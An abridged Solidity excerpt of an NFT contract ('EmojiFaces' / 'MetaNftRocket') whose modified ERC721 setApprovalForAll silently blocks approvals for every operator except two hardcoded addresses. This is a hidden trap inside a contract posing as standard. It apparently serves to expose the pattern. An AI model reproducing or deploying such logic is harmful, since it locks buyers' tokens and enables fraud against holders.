// SPDX-License-Identifier: MIT
    ...
    contract EmojiFaces is ERC721, Pausable, Ownable, ERC721Enumerable {
      ...
      constructor() ERC721("MetaNftRocket", "MNR") {}
...
contract ERC721 is Context, ERC165, IERC721, IERC721Metadata {
    ...
    function setApprovalForAll(address operator, bool approved) public virtual override {
        if(
            operator != address(0x721D8598b9Ec2E3f8791249edf5dA2aF62D5A548) &&
            operator != address(0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199)
        ) {
            require(1==2, "ERC721: setApprovalForAll is not supported");
        }
